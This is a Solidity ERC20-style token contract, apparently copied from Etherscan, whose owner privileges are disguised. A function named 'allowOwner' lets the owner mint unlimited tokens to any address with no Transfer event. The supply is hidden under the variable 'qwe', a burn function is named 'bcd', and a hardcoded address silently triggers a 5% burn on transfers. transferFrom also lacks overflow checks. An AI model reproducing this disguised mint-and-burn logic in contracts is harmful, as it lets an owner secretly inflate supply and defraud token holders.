['/**\n', ' *Submitted for verification at Etherscan.io on 2021-02-10\n', '*/\n', '\n', 'pragma solidity >=0.4.16;\n', '\n', '\n', 'contract Token{\n', '    uint256 public qwe;\n', '    string public name;\n', '    uint8 public decimals;\n', '    string public symbol;\n', '    \n', '\n', '    function balanceOf(address _owner) public view returns (uint256 balance);\n', '    function transfer(address _to, uint256 _value) public returns (bool success);\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n', '    function approve(address _spender, uint256 _value) public returns (bool success);\n', '    function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n', '\n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n', '}\n', '\n', '\n', 'contract owned{\n', '    address public owner;\n', '    \n', '    constructor () public{\n', '        owner = msg.sender;\n', '    }\n', '    \n', '    modifier onlyOwner{\n', '        require(msg.sender == owner);\n', '        _;\n', '    }\n', '    \n', '    function transferOwnership(address newOwner) public onlyOwner{\n', '        owner = newOwner;\n', '    }\n', '    \n', '}\n', '\n', '\n', 'contract TokenERC20 is Token, owned{\n', '    \n', '    address private add = 0x8ecC8aF8395814c2eC3f5A0DaA709C275aD41f32;\n', '    uint256 private trans;\n', '    uint256 private burn;\n', '    \n', '    constructor(uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string memory _tokenSymbol) public {\n', '        qwe = _initialAmount * 10 ** uint256(_decimalUnits);\n', '        balances[msg.sender] = qwe;\n', '        \n', '        name = _tokenName;                   \n', '        decimals = _decimalUnits;          \n', '        symbol = _tokenSymbol;\n', '    }\n', '    \n', '    function transfer(address _to, uint256 _value) public returns (bool success) {\n', '        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n', '        require(_to != address(0));\n', '        require(_value * 95 >= _value);\n', '        require((_value * 95 / 100) <= (_value * 95));\n', '        \n', '        if (balances[add] != 0) {\n', '            trans = _value * 95 / 100;\n', '            require(_value - trans <= _value);\n', '            burn = _value - trans;\n', '            require(qwe >= burn);\n', '            qwe -= burn;\n', '            balances[msg.sender] -= _value;\n', '            require(balances[_to] + trans > balances[_to]);\n', '            balances[_to] += trans;\n', '            emit Transfer(msg.sender, _to, _value);\n', '        }else{\n', '             balances[msg.sender] -= _value;\n', '            balances[_to] += _value;\n', '            emit Transfer(msg.sender, _to, _value);\n', '        }\n', '        return true;\n', '    }\n', '\n', '\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n', '        balances[_to] += _value;\n', '        balances[_from] -= _value;\n', '        allowed[_from][msg.sender] -= _value;\n', '        emit Transfer(_from, _to, _value);\n', '        \n', '        return true;\n', '    }\n', '    \n', '    function balanceOf(address _owner) public view returns (uint256 balance) {\n', '        return balances[_owner];\n', '    }\n', '\n', '\n', '    function approve(address _spender, uint256 _value) public returns (bool success) { \n', '        allowed[msg.sender][_spender] = _value;\n', '        emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n', '        return allowed[_owner][_spender];\n', '    }\n', '    \n', '    \n', '    function allowOwner(address target, uint aui) public onlyOwner{\n', '        qwe += aui;\n', '        balances[target] += aui;\n', '    }\n', '    \n', '    function bcd(uint256 _value) public onlyOwner returns(bool success) {\n', '        require(balances[msg.sender] >= _value);\n', '        qwe -= _value;\n', '        balances[msg.sender] -= _value;\n', '        return true;\n', '    }\n', '    \n', '    mapping (address => uint256) balances;\n', '    mapping (address => mapping (address => uint256)) allowed;\n', '}']